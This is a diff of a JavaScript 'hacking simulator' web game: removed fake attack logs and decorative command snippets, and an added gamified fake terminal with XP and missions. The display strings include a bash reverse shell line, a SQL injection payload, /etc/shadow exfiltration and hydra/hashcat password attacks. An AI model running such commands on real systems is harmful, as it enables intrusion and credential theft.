-  { type: 'data', msg: '22/tcp open   ssh      OpenSSH 7.4 (protocol 2.0)' },
-  { type: 'data', msg: '80/tcp open   http     Apache httpd 2.4.6' },
-  { type: 'data', msg: '443/tcp open  https    OpenSSL 1.0.2k' },
-  { type: 'warn', msg: 'Firewall detected on 10.0.0.1 — initiating evasion protocol' },
-  { type: 'info', msg: 'Attempting brute-force injection on port 443...' },
-  { type: 'info', msg: 'Shifting IP via Tor proxy chain... 3 hops established' },
-  { type: 'warn', msg: 'IDS alert triggered — packet fragmentation activated' },
-  { type: 'success', msg: 'Firewall bypass successful — stealth mode engaged' },
-  { type: 'info', msg: 'Deploying SQL injection payload on endpoint /api/v2/auth' },
-  { type: 'data', msg: "PAYLOAD: ' OR 1=1 UNION SELECT table_name FROM information_schema--" },
-  { type: 'warn', msg: 'WAF blocking request — encoding payload with base64 obfuscation' },
-  { type: 'success', msg: 'SQL injection successful — database schema exposed' },
-  { type: 'data', msg: 'Tables found: [users] [sessions] [transactions] [admin_keys]' },
-  { type: 'info', msg: 'Extracting credential hashes from table: users (4,821 rows)' },
-  { type: 'data', msg: 'admin:$2a$12$K8ZpdrjwzSmS7OPAl9UR8OcKHQJwQq0YBs9wPa3UQqD...' },
-  { type: 'info', msg: 'Running hashcat GPU cracker — 48.3 GH/s attack rate' },
-  { type: 'success', msg: 'Root access obtained on server: 192.168.23.109' },
-  { type: 'info', msg: 'Spawning reverse shell... bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' },
-  { type: 'success', msg: 'Reverse shell connected — TTY allocated' },
-  { type: 'warn', msg: 'Privilege escalation required — scanning for SUID binaries' },
-  { type: 'data', msg: '/usr/bin/find — SUID set [EXPLOITABLE]' },
-  { type: 'success', msg: 'Privilege escalation complete — UID 0 (root) obtained' },
-  { type: 'info', msg: 'Deploying persistence module... adding cron backdoor' },
-  { type: 'sys', msg: 'Cron job installed: */5 * * * * /tmp/.sysupdate' },
-  { type: 'info', msg: 'Exfiltrating /etc/shadow to C2 server 45.33.32.156:8443' },
-  { type: 'warn', msg: 'High network traffic detected — throttling to 512KB/s' },
-  { type: 'success', msg: 'Data exfiltration complete — 2.3 MB transferred' },
-  { type: 'info', msg: 'Clearing auth logs: /var/log/auth.log /var/log/syslog' },
-  { type: 'success', msg: 'Log sanitization complete — covering tracks' },
-  { type: 'info', msg: 'Lateral movement initiated — scanning internal network' },
-  { type: 'data', msg: 'Discovered hosts: 192.168.1.12, 192.168.1.45, 192.168.1.88' },
-  { type: 'warn', msg: 'Honeypot detected at 192.168.1.45 — blacklisting' },
-  { type: 'success', msg: 'SMB exploit successful on 192.168.1.12 (EternalBlue CVE-2017-0144)' },
-  { type: 'info', msg: 'Mimikatz credential dump initiated...' },
-  { type: 'data', msg: 'USERNAME: administrator  HASH: aad3b435b51404eeaad3b435b51404ee' },
-  { type: 'info', msg: 'Pass-the-hash attack on domain controller...' },
-  { type: 'success', msg: 'Domain admin credentials obtained — full network compromise' },
-  { type: 'warn', msg: 'Anomaly detection system alert — response team notified' },
-  { type: 'info', msg: 'Activating kill switch — wiping forensic evidence' },
-  { type: 'success', msg: 'Session encrypted and tunneled through Tor exit node' },
-];
-
-let logIdx = 0;
-let autoLogInterval;
-
-function addLog(type, msg) {
-  const el = document.getElementById('terminal-output');
-  const now = new Date();
-  const ts = `[${String(now.getHours()).padStart(2,'0')}:${String(now.getMinutes()).padStart(2,'0')}:${String(now.getSeconds()).padStart(2,'0')}]`;
-  
+  const pct = Math.round((bootIdx / bootLogs.length) * 100);
+  bootFill.style.width = pct + '%';
+  bootPct.textContent = pct + '%';
+  bootStatus.textContent = bootStatuses[bootIdx] || 'LOADING...';
   const line = document.createElement('div');
-  line.className = 'log-line';
-  
-  const badge = type === 'info' ? '[INFO]' : type === 'warn' ? '[WARN]' : 
-                type === 'success' ? '[OK]  ' : type === 'error' ? '[ERR] ' : 
-                type === 'data' ? '[DATA]' : '[SYS] ';
-  
-  line.innerHTML = `<span class="log-ts">${ts}</span><span class="log-${type}">${badge} ${escapeHtml(msg)}</span>`;
-  el.appendChild(line);
-  
-  // keep max 200 lines
-  while (el.children.length > 200) el.removeChild(el.firstChild);
-  el.scrollTop = el.scrollHeight;
+  line.className = 'boot-log-line';
+  line.textContent = '[ OK ] ' + bootLogs[bootIdx];
+  bootLog.appendChild(line);
+  bootLog.scrollTop = bootLog.scrollHeight;
+  bootIdx++;
+  setTimeout(bootStep, 180 + Math.random() * 120);
 }
 
-function escapeHtml(str) {
-  return str.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+setTimeout(bootStep, 500);
+
+// ============================================================
+// CLOCK
+// ============================================================
+function updateClock() {
+  const now = new Date();
+  document.getElementById('clock').textContent =
+    now.toTimeString().split(' ')[0];
+}
+setInterval(updateClock, 1000);
+updateClock();
+
+// ============================================================
+// TABS
+// ============================================================
+function switchTab(name) {
+  document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
+  document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+  document.getElementById('panel-' + name).classList.add('active');
+  event.target.classList.add('active');
+  playClick();
 }
 
-function autoLog() {
-  if (logIdx >= hackLogs.length) logIdx = 0;
-  const log = hackLogs[logIdx++];
-  addLog(log.type, log.msg);
+// ============================================================
+// SOUND
+// ============================================================
+let audioCtx = null;
+function getAudio() {
+  if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+  return audioCtx;
+}
+function playTone(freq, dur, type='square', vol=0.05) {
+  if (!state.sound) return;
+  try {
+    const ac = getAudio();
+    const o = ac.createOscillator();
+    const g = ac.createGain();
+    o.connect(g); g.connect(ac.destination);
+    o.type = type; o.frequency.value = freq;
+    g.gain.setValueAtTime(vol, ac.currentTime);
+    g.gain.exponentialRampToValueAtTime(0.001, ac.currentTime + dur);
+    o.start(); o.stop(ac.currentTime + dur);
+  } catch(e) {}
+}
+function playClick() { playTone(800, 0.05, 'square', 0.03); }
+function playSuccess() {
+  playTone(440, 0.1, 'sine', 0.05);
+  setTimeout(() => playTone(550, 0.1, 'sine', 0.05), 100);
+  setTimeout(() => playTone(660, 0.15, 'sine', 0.05), 200);
+}
+function playError() { playTone(200, 0.2, 'sawtooth', 0.05); }
+function playBeep() { playTone(600, 0.08, 'square', 0.04); }
+
+function toggleSound() {
+  state.sound = !state.sound;
+  document.getElementById('soundBtn').textContent = '🔊 SFX: ' + (state.sound ? 'ON' : 'OFF');
+  playClick();
 }
 
-// ═══════════════════════════════════════════
-// NETWORK GRAPH
-// ═══════════════════════════════════════════
-let netHistory = Array(40).fill(0);
+// ============================================================
+// TOAST
+// ============================================================
+let toastTimer = null;
+function showToast(msg) {
+  const t = document.getElementById('toast');
+  t.textContent = msg;
+  t.classList.add('show');
+  clearTimeout(toastTimer);
+  toastTimer = setTimeout(() => t.classList.remove('show'), 3000);
+}
 
-function drawNetGraph() {
-  const canvas = document.getElementById('net-graph');
-  if (!canvas) return;
-  const ctx = canvas.getContext('2d');
-  const w = canvas.width = canvas.offsetWidth;
-  const h = canvas.height = 80;
-  
-  ctx.clearRect(0, 0, w, h);
-  
-  // grid
-  ctx.strokeStyle = '#001500';
-  ctx.lineWidth = 1;
-  for (let y = 0; y <= 4; y++) {
-    ctx.beginPath();
-    ctx.moveTo(0, y * h/4);
-    ctx.lineTo(w, y * h/4);
-    ctx.stroke();
+// ============================================================
+// XP & LEVEL SYSTEM
+// ============================================================
+function addXP(amount, reason) {
+  state.xp += amount;
+  addActivity(`+${amount} XP — ${reason}`);
+  updateProfile();
+  checkAchievements();
+  if (state.xp >= 1000) unlockAchievement('xp1000');
+}
+
+function updateProfile() {
+  // Calculate level
+  const level = Math.floor(1 + Math.sqrt(state.xp / 100));
+  state.level = level;
+  // Calculate rank
+  let rank = RANKS[0];
+  for (const r of RANKS) { if (state.xp >= r.xp) rank = r; }
+  // XP to next level
+  const nextLvl = level + 1;
+  const xpForNext = (nextLvl - 1) * (nextLvl - 1) * 100;
+  const xpForCurr = (level - 1) * (level - 1) * 100;
+  const progress = ((state.xp - xpForCurr) / (xpForNext - xpForCurr)) * 100;
+
+  document.getElementById('p-level').textContent = level;
+  document.getElementById('p-rank').textContent = '◈ ' + rank.name;
+  document.getElementById('p-missions').textContent = state.missionsCompleted;
+  document.getElementById('p-hacks').textContent = state.hacks;
+  document.getElementById('p-decrypts').textContent = state.decrypts;
+  document.getElementById('xp-display').textContent = state.xp + ' / ' + xpForNext;
+  document.getElementById('xp-fill').style.width = Math.min(100, progress) + '%';
+  document.getElementById('m-xp').textContent = state.xp;
+  if (level >= 5) unlockAchievement('level5');
+}
+
+// ============================================================
+// ACTIVITY LOG
+// ============================================================
+function addActivity(msg) {
+  const now = new Date().toTimeString().split(' ')[0];
+  state.activityLog.unshift(`[${now}] ${msg}`);
+  if (state.activityLog.length > 30) state.activityLog.pop();
+  const feed = document.getElementById('activity-feed');
+  if (feed) {
+    feed.innerHTML = state.activityLog.slice(0,15).map(l =>
+      `<div style="border-bottom:1px solid rgba(0,255,65,0.05);padding:2px 0;">${l}</div>`
+    ).join('');
   }
-  
-  // gradient fill
-  const grad = ctx.createLinearGradient(0, 0, 0, h);
-  grad.addColorStop(0, 'rgba(0,229,255,0.3)');
-  grad.addColorStop(1, 'rgba(0,229,255,0)');
-  
-  ctx.beginPath();
-  ctx.moveTo(0, h);
-  for (let i = 0; i < netHistory.length; i++) {
-    const x = (i / (netHistory.length - 1)) * w;
-    const y = h - (netHistory[i] / 100) * h;
-    ctx.lineTo(x, y);
-  }
-  ctx.lineTo(w, h);
-  ctx.closePath();
-  ctx.fillStyle = grad;
-  ctx.fill();
-  
-  // line
-  ctx.beginPath();
-  ctx.strokeStyle = '#00e5ff';
-  ctx.lineWidth = 2;
-  ctx.shadowColor = '#00e5ff';
-  ctx.shadowBlur = 6;
-  for (let i = 0; i < netHistory.length; i++) {
-    const x = (i / (netHistory.length - 1)) * w;
-    const y = h - (netHistory[i] / 100) * h;
-    i === 0 ? ctx.moveTo(x, y) : ctx.lineTo(x, y);
-  }
-  ctx.stroke();
 }
 
-// ═══════════════════════════════════════════
-// DECRYPT MATRIX
-// ═══════════════════════════════════════════
-const decryptLabels = ['ADMIN_PWD', 'DB_SECRET', 'API_TOKEN', 'ROOT_KEY ', 'SSH_PASS ', 'TLS_CERT '];
-const decryptStates = ['cracking', 'cracking', 'done', 'locked', 'cracking', 'done'];
-const chars62 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%';
-
-function randomChars(n) {
-  return Array.from({length: n}, () => chars62[Math.floor(Math.random() * chars62.length)]).join('');
+// ============================================================
+// SYSTEM STATS ANIMATION
+// ============================================================
+function animateStats() {
+  const cpu = 20 + Math.random() * 60;
+  const ram = 30 + Math.random() * 50;
+  const ping = Math.floor(5 + Math.random() * 40);
+  document.getElementById('cpu-val').textContent = cpu.toFixed(1) + '%';
+  document.getElementById('ram-val').textContent = ram.toFixed(1) + '%';
+  document.getElementById('net-val').textContent = ping + 'ms';
 }
+setInterval(animateStats, 2000);
+animateStats();
 
-function initDecryptMatrix() {
-  const el = document.getElementById('decrypt-matrix');
-  el.innerHTML = '';
-  decryptLabels.forEach((label, i) => {
-    const row = document.createElement('div');
-    row.className = 'decrypt-row';
-    const stClass = decryptStates[i] === 'cracking' ? 'ds-cracking' : 
-                    decryptStates[i] === 'done' ? 'ds-done' : 'ds-locked';
-    const stText = decryptStates[i] === 'cracking' ? 'CRACK' : 
-                   decryptStates[i] === 'done' ? 'DONE' : 'LOCK';
-    row.innerHTML = `
-      <span class="decrypt-label">${label}</span>
-      <span class="decrypt-chars" id="dc-${i}">${randomChars(12)}</span>
-      <span class="decrypt-status ${stClass}">${stText}</span>`;
-    el.appendChild(row);
-  });
-}
-
-function updateDecryptChars() {
-  decryptLabels.forEach((_, i) => {
-    if (decryptStates[i] === 'cracking') {
-      const el = document.getElementById(`dc-${i}`);
-      if (el) el.textContent = randomChars(12);
-    }
-  });
-}
-
-// ═══════════════════════════════════════════
-// FIREWALL BARS
-// ═══════════════════════════════════════════
-const fwTargets = [
-  { label: 'LAYER 3 FIREWALL', pct: 0 },
-  { label: 'IDS/IPS BYPASS', pct: 0 },
-  { label: 'WAF EVASION', pct: 0 },
-  { label: 'PKI SPOOF', pct: 0 },
-];
-
-function initFwBars() {
-  const el = document.getElementById('fw-bars');
-  el.innerHTML = '';
-  fwTargets.forEach((fw, i) => {
-    const div = document.createElement('div');
-    div.className = 'fw-row';
-    div.innerHTML = `
-      <div class="fw-label"><span>${fw.label}</span><span class="pct" id="fw-pct-${i}">0%</span></div>
-      <div class="stat-bar-track"><div class="stat-bar-fill bar-red" id="fw-bar-${i}" style="width:0%"></div></div>`;
-    el.appendChild(div);
-  });
-}
-
-function updateFwBars() {
-  fwTargets.forEach((fw, i) => {
-    fw.pct = Math.min(100, fw.pct + Math.random() * 2.5);
-    const bar = document.getElementById(`fw-bar-${i}`);
-    const pct = document.getElementById(`fw-pct-${i}`);
-    if (bar) bar.style.width = fw.pct + '%';
-    if (pct) pct.textContent = Math.floor(fw.pct) + '%';
-    if (fw.pct >= 100) {
-      if (bar) bar.style.background = 'linear-gradient(90deg, #003300, var(--green))';
-      if (bar) bar.style.boxShadow = '0 0 8px var(--green)';
-      if (pct) { pct.textContent = 'BYPASSED'; pct.style.color = 'var(--green)'; }
-      fw.pct = 0; // reset and animate again
-    }
-  });
-}
-
-// ═══════════════════════════════════════════
-// EXPLOIT LIST
-// ═══════════════════════════════════════════
-const exploits = [
-  'CVE-2024-21887 ✓ LOADED',
-  'CVE-2023-46604 ✓ LOADED',
-  'EternalBlue    ✓ ACTIVE',
-  'Log4Shell      ✓ READY',
-  'ZeroLogon      ○ STAGING',
-  'PrintNightmare ✓ LOADED',
-];
-
-function initExploits() {
-  const el = document.getElementById('exploit-list');
-  exploits.forEach(e => {
+// ============================================================
+// MINI MAP
+// ============================================================
+function buildMiniMap() {
+  const map = document.getElementById('mini-map');
+  if (!map) return;
+  const nodes = [
+    {x:'10%',y:'50%'},{x:'30%',y:'20%'},{x:'30%',y:'75%'},
+    {x:'55%',y:'40%'},{x:'75%',y:'20%'},{x:'75%',y:'70%'},{x:'90%',y:'45%'}
+  ];
+  map.innerHTML = '';
+  nodes.forEach((n, i) => {
     const d = document.createElement('div');
-    d.style.color = e.includes('✓') ? 'var(--green)' : 'var(--yellow)';
-    d.textContent = e;
-    el.appendChild(d);
+    d.className = 'map-node';
+    d.style.cssText = `left:${n.x};top:${n.y};transform:translate(-50%,-50%);animation-delay:${i*0.3}s`;
+    map.appendChild(d);
   });
 }
 
-// ═══════════════════════════════════════════
-// SYSTEM STATS UPDATE
-// ═══════════════════════════════════════════
-function updateStats() {
-  const cpu = 60 + Math.random() * 35;
-  const ram = 70 + Math.random() * 20;
-  const disk = 30 + Math.random() * 50;
-  const net = 40 + Math.random() * 55;
-  const netKb = Math.floor(net * 8.5);
-
-  document.getElementById('cpu-bar').style.width = cpu + '%';
-  document.getElementById('cpu-pct').textContent = Math.floor(cpu) + '%';
-  document.getElementById('ram-bar').style.width = ram + '%';
-  document.getElementById('ram-pct').textContent = Math.floor(ram) + '%';
-  document.getElementById('disk-bar').style.width = disk + '%';
-  document.getElementById('disk-pct').textContent = Math.floor(disk) + '%';
-  document.getElementById('net-bar').style.width = net + '%';
-  document.getElementById('net-pct').textContent = netKb + ' KB/s';
-
-  netHistory.push(net);
-  netHistory.shift();
-  drawNetGraph();
-
-  // update mini stats
-  const cpuVal = document.getElementById('cpu-val');
-  const packetVal = document.getElementById('packets-val');
-  if (cpuVal) cpuVal.textContent = Math.floor(cpu) + '%';
-  if (packetVal) packetVal.textContent = Math.floor(netKb / 0.8);
-
-  // random IP change
-  const ips = ['45.33.32.156', '198.168.52.1', '104.21.0.1', '23.45.67.89', '91.108.4.1', '185.220.101.1'];
-  const ip1 = document.getElementById('dyn-ip-1');
-  const ip2 = document.getElementById('dyn-ip-2');
-  if (ip1 && Math.random() > 0.8) ip1.textContent = ips[Math.floor(Math.random() * ips.length)];
-  if (ip2 && Math.random() > 0.8) ip2.textContent = ips[Math.floor(Math.random() * ips.length)];
-}
-
-// ═══════════════════════════════════════════
-// INTERACTIVE TYPING
-// ═══════════════════════════════════════════
-const codeSnippets = [
-  'nmap -sS -O -p- 192.168.1.0/24',
-  'sqlmap -u "http://target.com/login" --dbs --batch',
-  'msfconsole -q -x "use exploit/multi/handler"',
-  'hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.1',
-  'hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt',
-  'nc -lvnp 4444',
-  'python3 exploit.py --target 192.168.1.105 --port 443',
-  './run_exploit.sh --mode stealth --obfuscate',
-  'john --wordlist=rockyou.txt --format=bcrypt hashes.txt',
-  'curl -X POST "http://target/api" -d \'{"cmd":"id"}\'',
-  'tcpdump -i eth0 -w capture.pcap port 443',
-  'openssl s_client -connect target.com:443 -servername target.com',
-];
-
-let typingTimeout;
-let lastInteract = 0;
-
-function startTyping() {
-  const snippet = codeSnippets[Math.floor(Math.random() * codeSnippets.length)];
-  const display = document.getElementById('typing-display');
-  let i = 0;
-  display.textContent = '';
-  clearTimeout(typingTimeout);
-  
-  function typeChar() {
-    if (i < snippet.length) {
-      display.textContent += snippet[i++];
-      typingTimeout = setTimeout(typeChar, 30 + Math.random() * 40);
-    } else {
-      setTimeout(() => { display.textContent = ''; }, 2000);
-    }
-  }
-  typeChar();
-}
-
-document.addEventListener('keydown', () => {
-  const now = Date.now();
-  if (now - lastInteract > 800) { startTyping(); lastInteract = now; }
-});
-
-document.addEventListener('touchstart', () => {
-  const now = Date.now();
-  if (now - lastInteract > 800) { startTyping(); lastInteract = now; }
-});
-
-// ═══════════════════════════════════════════
-// POPUP SYSTEM
-// ═══════════════════════════════════════════
-const popupData = {
-  attack: {
-    icon: '⚡', title: '⚡ ATTACK EXECUTED', success: false,
-    msg: 'CYBER ATTACK INITIATED\n\nTarget: 192.168.23.109\nVector: Multi-stage SQL + Buffer Overflow\nPayload: Reverse Shell (Meterpreter)\nStatus: PAYLOAD DELIVERED\n\nEvasion: Active | Logs: Cleared',
+// ============================================================
+// TERMINAL
+// ============================================================
+const termCommands = {
+  help: () => [
+    {t:'info', v:'Available Commands:'},
+    {t:'out', v:'  help        — Show this help'},
+    {t:'out', v:'  whoami      — Display operator identity'},
+    {t:'out', v:'  scan <ip>   — Simulate port scan'},
+    {t:'out', v:'  decrypt <s> — Simulate decryption'},
+    {t:'out', v:'  ifconfig    — Show network interfaces'},
+    {t:'out', v:'  ls          — List directory contents'},
+    {t:'out', v:'  cat <file>  — Read file contents'},
+    {t:'out', v:'  ping <host> — Simulate ping'},
+    {t:'out', v:'  status      — System status'},
+    {t:'out', v:'  xp          — Show XP and level'},
+    {t:'out', v:'  matrix      — Toggle matrix rain'},
+    {t:'out', v:'  clear       — Clear terminal'},
+    {t:'info', v:'⚠ All functions are SIMULATED. No real operations.'},
+  ],
+  whoami: () => [{t:'out',v:'root@hackingos | GHOST_X | Level ' + state.level + ' | ' + getrank()}],
+  ifconfig: () => [
+    {t:'info',v:'eth0: 192.168.1.' + Math.floor(Math.random()*254+1) + '  netmask 255.255.255.0'},
+    {t:'info',v:'lo:   127.0.0.1  netmask 255.0.0.0'},
+    {t:'out',v:'VPN:  10.0.0.' + Math.floor(Math.random()*254+1) + '  [ENCRYPTED]'},
+  ],
+  ls: () => [
+    {t:'out',v:'drwxr-xr-x  exploits/'},
+    {t:'out',v:'drwxr-xr-x  tools/'},
+    {t:'out',v:'-rw-r--r--  readme.txt'},
+    {t:'out',v:'-rw-------  mission_log.enc'},
+    {t:'out',v:'-rwxr-xr-x  scanner.sim'},
+    {t:'out',v:'-rw-r--r--  system.conf'},
+  ],
+  status: () => [
+    {t:'info',v:'=== SYSTEM STATUS ==='},
+    {t:'out',v:'CPU:    ' + (20+Math.random()*60).toFixed(1) + '%'},
+    {t:'out',v:'RAM:    ' + (30+Math.random()*50).toFixed(1) + '%'},
+    {t:'out',v:'UPTIME: ' + Math.floor(Math.random()*9999) + ' seconds'},
+    {t:'out',v:'KERNEL: HackOS 6.6.6-cyber'},
+  ],
+  xp: () => [{t:'info',v:'XP: '+state.xp+' | Level: '+state.level+' | Rank: '+getrank()}],
+  matrix: () => {
+    matrixRunning = !matrixRunning;
+    canvas.style.opacity = matrixRunning ? '0.12' : '0';
+    return [{t:'out',v:'Matrix rain ' + (matrixRunning ? 'ENABLED' : 'DISABLED')}];
   },
-  decrypt: {
-    icon: '⬡', title: 'DATABASE DECRYPTED', success: true,
-    msg: 'DECRYPTION COMPLETE\n\nAlgorithm: AES-256-CBC → BROKEN\nRecords: 4,821 credentials exposed\nTime: 00:03:47\nMethod: GPU Rainbow Table\n\nData written to: /tmp/.exfil/',
-  },
-  rootkit: {
-    icon: '◈', title: 'ROOTKIT DEPLOYED', success: false,
-    msg: 'ROOTKIT INSTALLATION COMPLETE\n\nKernel module: sys_hide.ko → LOADED\nHiding: processes, files, netconns\nPersistence: /etc/rc.local modified\nAnti-forensics: Active\n\nSystem compromise: TOTAL',
-  },
-  granted: {
-    icon: '✓', title: 'ACCESS GRANTED', success: true,
-    msg: 'SSH BRUTE FORCE SUCCESS\n\nHost: 10.0.0.1:22\nCredential: root:password123\nShell: /bin/bash (TTY)\nPrivilege: ROOT (UID 0)\n\nSession ID: 0xDEADBEEF',
-  },
+  clear: () => 'CLEAR',
 };
 
-function showPopup(type) {
-  const data = popupData[type];
-  const overlay = document.getElementById('popup-overlay');
-  const box = document.getElementById('popup-box');
-  
-  document.getElementById('popup-icon').textContent = data.icon;
-  document.getElementById('popup-title').textContent = data.title;
-  document.getElementById('popup-msg').textContent = data.msg;
-  
-  const close = document.getElementById('popup-close');
-  box.classList.toggle('success-popup', data.success);
-  box.style.color = data.success ? 'var(--green)' : 'var(--red)';
-  close.style.color = data.success ? 'var(--green)' : 'var(--red)';
-  
-  overlay.classList.add('show');
-  addLog(data.success ? 'success' : 'warn', data.title + ' — ' + data.msg.split('\n')[0]);
+function getrank() {
+  let rank = RANKS[0];
+  for (const r of RANKS) { if (state.xp >= r.xp) rank = r; }
+  return rank.name;
 }
 
-function closePopup() {
-  document.getElementById('popup-overlay').classList.remove('show');
+function handleTermKey(e) {
+  const input = document.getElementById('term-input');
+  if (e.key === 'Enter') {
+    const cmd = input.value.trim();
+    input.value = '';
+    if (!cmd) return;
+    state.termHistory.unshift(cmd);
+    state.termHistIdx = -1;
+    execTermCmd(cmd);
+    termCmdCount++;
+    if (termCmdCount >= 10) unlockAchievement('terminal10');
+    addXP(2, 'Terminal command');
+    playBeep();
+  } else if (e.key === 'ArrowUp') {
+    state.termHistIdx = Math.min(state.termHistIdx + 1, state.termHistory.length - 1);
+    input.value = state.termHistory[state.termHistIdx] || '';
+    e.preventDefault();
+  } else if (e.key === 'ArrowDown') {
+    state.termHistIdx = Math.max(state.termHistIdx - 1, -1);
+    input.value = state.termHistIdx >= 0 ? state.termHistory[state.termHistIdx] : '';
+    e.preventDefault();
+  }
 }
 
-document.getElementById('popup-overlay').addEventListener('click', function(e) {
-  if (e.target === this) closePopup();
-});
+function execTermCmd(raw) {
+  const body = document.getElementById('term-body');
+  const parts = raw.trim().split(/\s+/);
+  const cmd = parts[0].toLowerCase();
+  const arg = parts.slice(1).join(' ');
 
-// ═══════════════════════════════════════════
-// CLEAR LOGS
-// ═══════════════════════════════════════════
-function clearLogs() {
-  const el = document.getElementById('terminal-output');
-  el.innerHTML = '';
-  addLog('sys', 'Log buffer cleared — forensic wipe initiated');
-  addLog('success', 'All traces removed from memory');
+  // Echo input
+  addTermLine('prompt', `root@hackingos:~# ${raw}`);
+
+  if (cmd === 'clear') { body.innerHTML = ''; return; }
+
+  const fn = termCommands[cmd];
+  if (fn) {
+    const out = fn();
+    if (Array.isArray(out)) {
+      out.forEach(o => addTermLine(o.t, o.v));
+    }
+  } else if (cmd === 'scan') {
+    const ip = arg || '192.168.1.1';
+    addTermLine('info', `Scanning ${ip} [SIMULATION]...`);
+    fakeScanTerm(ip);
+  } else if (cmd === 'decrypt') {
+    const s = arg || 'ENCRYPTED_DATA';
+    addTermLine('info', `Decrypting: ${s} [SIMULATION]`);
+    fakeDecryptTerm(s);
+  } else if (cmd === 'ping') {
+    const host = arg || '8.8.8.8';
+    fakePingTerm(host);
+  } else if (cmd === 'cat') {
+    fakecat(arg);
+  } else {
+    addTermLine('err', `Command not found: ${cmd}. Type 'help' for commands.`);
+    playError();
+  }
+  body.scrollTop = body.scrollHeight;
 }
 
-// ═══════════════════════════════════════════
+function addTermLine(type, text) {
+  const body = document.getElementById('term-body');
+  const d = document.createElement('div');
+  d.className = 't-line';
+  if (type === 'prompt') { d.innerHTML = `<span class="t-prompt">${text.substring(0, text.indexOf('#')+1)}</span><span class="t-cmd">${text.substring(text.indexOf('#')+1)}</span>`; }
+  else if (type === 'out') d.innerHTML = `<span class="t-out">${text}</span>`;
+  else if (type === 'err') d.innerHTML = `<span class="t-err">${text}</span>`;
+  else if (type === 'info') d.innerHTML = `<span class="t-info">${text}</span>`;
+  body.appendChild(d);
+  body.scrollTop = body.scrollHeight;
+}
+
+function fakeScanTerm(ip) {
+  const ports = [22, 80, 443, 8080, 3306, 21, 25, 53];
+  let delay = 100;
+  ports.forEach(p => {
+    setTimeout(() => {
+      const open = Math.random() > 0.5;
+      addTermLine(open ? 'out' : 'err',
+        `  ${ip}:${p}  ${open ? '[OPEN]' : '[CLOSED]'}  ${open ? getServiceName(p) : ''}`);
+    }, delay);
+    delay += 150;
+  });
+  setTimeout(() => { addTermLine('info', 'Scan complete.'); state.hacks++; addXP(15, 'Network scan'); }, delay);
+}
+
+function fakeDecryptTerm(s) {
+  let i = 0;
+  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*';
+  const result = s.split('').map(c => c.toUpperCase()).join('');
+  const interval = setInterval(() => {
+    const scrambled = result.split('').map((c, idx) =>
+      idx < i ? c : chars[Math.floor(Math.random() * chars.length)]
+    ).join('');
+    const body = document.getElementById('term-body');
+    const last = body.lastElementChild;
+    if (last && last.dataset.decr) { last.remove(); }
+    const d = document.createElement('div');
+    d.className = 't-line'; d.dataset.decr = '1';
+    d.innerHTML = `<span class="t-info">  ${scrambled}</span>`;
+    body.appendChild(d);
+    body.scrollTop = body.scrollHeight;
+    i++;
+    if (i > result.length) {
+      clearInterval(interval);
+      addTermLine('out', 'Decryption complete: ' + result);
+      state.decrypts++;
+      addXP(20, 'Decryption');
+    }
+  }, 80);
+}
+
+function fakePingTerm(host) {
+  [1,2,3,4].forEach((_, i) => {
+    setTimeout(() => {
+      const ms = Math.floor(5 + Math.random() * 80);
+      addTermLine('out', `  PING ${host}: ${ms}ms ttl=64`);
+      if (i === 3) addTermLine('info', `4 packets: min=${ms-2}ms max=${ms+8}ms`);
+    }, i * 300);
+  });
+}
+
+function fakecat(file) {
+  const files = {
+    'readme.txt': ['HACKING OS - SIMULATION ONLY','For educational and entertainment purposes.','No real hacking capabilities.'],
+    'system.conf': ['[SYSTEM]','kernel=hackos-6.6.6','stealth_mode=enabled','vpn=active'],
+    'mission_log.enc': ['ERROR: File is encrypted. Use decrypt command.'],
+  };
+  const content = files[file];
+  if (!content) { addTermLine('err', `cat: ${file}: No such file or directory`); return; }
+  content.forEach(l => addTermLine('out', l));
+}
+
+function getServiceName(port) {
+  const s = {22:'SSH',80:'HTTP',443:'HTTPS',8080:'HTTP-ALT',3306:'MYSQL',21:'FTP',25:'SMTP',53:'DNS'};
+  return s[port] || 'UNKNOWN';
+}
+
+// ============================================================
+// MISSIONS
+// ============================================================
+const MISSIONS = [
+  {id:'m1',title:'RECON PHASE',desc:'Complete a simulated network scan to identify open ports.',diff:'easy',xp:50,action:'scanner'},
+  {id:'m2',title:'DATA EXTRACTION',desc:'Decrypt 3 encrypted messages using the Decryption Simulator.',diff:'medium',xp:100,action:'decrypt'},
+  {id:'m3',title:'KNOWLEDGE TEST',desc:'Score 7 or higher on the Cybersecurity Quiz.',diff:'medium',xp:150,action:'quiz'},
+  {id:'m4',title:'TERMINAL MASTERY',desc:'Execute 10 commands in the Cyber Terminal.',diff:'hard',xp:200,action:'terminal'},
+  {id:'m5',title:'FULL SPECTRUM',desc:'Complete 5 network scans and 5 decryptions.',diff:'hard',xp:300,action:'scanner'},
+];
+
+function buildMissions() {
+  const list = document.getElementById('missions-list');
+  list.innerHTML = '';
+  MISSIONS.forEach(m => {
+    const completed = state.missions_done && state.missions_done.has(m.id);
+    const div = document.createElement('div');
+    div.className = 'mission-item' + (completed ? ' completed' : '');
+    div.innerHTML = `
+      <div class="mission-title">${m.title}</div>
+      <div class="mission-desc">${m.desc}</div>
+      <span class="mission-reward">+${m.xp} XP</span>
+      <span class="mission-diff diff-${m.diff}">${m.diff.toUpperCase()}</span>
+      ${!completed ? `<br><button class="mission-btn" onclick="startMission('${m.id}')">ACCEPT MISSION</button>` : ''}
+    `;
+    list.appendChild(div);
+  });
+  const completed = (state.missions_done || new Set()).size;
+  document.getElementById('m-completed').textContent = completed;
+  document.getElementById('m-inprog').textContent = MISSIONS.length - completed;
+}
+
+function startMission(id) {
+  const m = MISSIONS.find(x => x.id === id);
+  if (!m) return;
+  if (!state.missions_done) state.missions_done = new Set();
+  if (state.missions_done.has(id)) return;
+  state.missions_done.add(id);
+  state.missionsCompleted++;
+  addXP(m.xp, 'Mission: ' + m.title);
+  addMissionLog('Completed: ' + m.title);
+  buildMissions();
+  showToast('🎯 Mission Complete: ' + m.title + ' +' + m.xp + ' XP');
+  playSuccess();
